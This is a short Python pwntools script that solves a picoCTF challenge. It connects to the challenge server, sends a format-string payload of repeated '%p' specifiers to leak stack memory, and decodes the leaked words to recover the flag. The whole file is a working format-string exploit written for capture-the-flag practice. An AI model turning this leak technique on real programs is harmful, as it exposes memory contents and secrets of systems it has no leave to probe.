from pwn import *

r = remote('mimas.picoctf.net', 54247)

r.recvuntil("Give me your order and I'll read it back to you:\n")

exploit_string = "%p" + "-%p"*64
r.sendline(exploit_string)

response = r.recvline()

response = response.replace(b"Here's your order: ", b"").strip().decode()

flag = ""

for ptr in response.split('-'):
    try:
        part = bytes.fromhex(ptr[2:]).decode('latin1')
        flag_part = ''.join([char if 32 <= ord(char) < 127 else '' for char in part[::-1]])
        flag += flag_part
    except ValueError:
        continue

start = flag.find("pico")
end = flag.find("}")

print("Flag:", flag[start:end+1])